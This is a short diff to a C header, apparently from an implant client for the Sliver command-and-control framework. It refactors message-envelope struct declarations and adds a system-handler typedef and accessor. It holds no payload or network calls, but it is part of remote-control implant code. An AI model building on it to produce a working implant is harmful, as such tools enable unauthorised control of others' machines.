@@ -1,5 +1,7 @@
 #pragma once
 
+typedef PENVELOPE(WINAPI* SYSTEM_HANDLER)(PENVELOPE);
+
 typedef enum _MsgType {
 	MsgRegister = 1,
 
@@ -315,20 +317,21 @@ typedef enum _MsgType {
 
 	// Access control list
 	MsgIcaclsReq,
+	MsgEnd,
 } MsgType;
 
-typedef struct _ENVELOPE {
+struct _ENVELOPE {
 	UINT64 uID;
 	UINT64 uType;
 	PBUFFER pData;
 	UINT64 uUnknownMessageType;
-} ENVELOPE, *PENVELOPE;
+};
 
-typedef struct _ENVELOPE_WRAPPER {
+struct _ENVELOPE_WRAPPER {
 	PSLIVER_HTTP_CLIENT pSliverClient;
 	PENVELOPE pEnvelope;
 	CRITICAL_SECTION CriticalSection;
-} ENVELOPE_WRAPPER, * PENVELOPE_WRAPPER;
+};
 
 typedef struct _FILE_INFO {
 	LPSTR lpName;
@@ -388,3 +391,5 @@ PENVELOPE ExecuteHandler
 (
 	_In_ PENVELOPE pEnvelope
 );
+
+SYSTEM_HANDLER* GetSystemHandler();
